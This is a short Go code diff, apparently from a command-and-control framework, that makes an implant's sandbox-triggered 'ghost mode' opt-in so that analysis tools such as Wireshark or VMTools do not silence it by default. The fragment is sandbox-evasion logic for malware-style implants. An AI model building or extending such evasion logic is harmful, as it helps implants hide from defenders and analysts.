@@ -57,6 +57,13 @@ func runSandboxCheck() {
 }
 
 func enterGhostMode(reason string) {
+	// Ghost protocol is opt-in (config blob "ghost_mode" / FORGEC2_GHOST_MODE).
+	// It is NOT active by default so a sandbox indicator on a legitimate host
+	// (e.g. Wireshark, VMTools) never silently silences a fresh implant.
+	if !ghostModeEnabled {
+		logDebugf("Ghost mode disabled, ignoring trigger: %s", reason)
+		return
+	}
 	if isInGhostMode() {
 		return
 	}
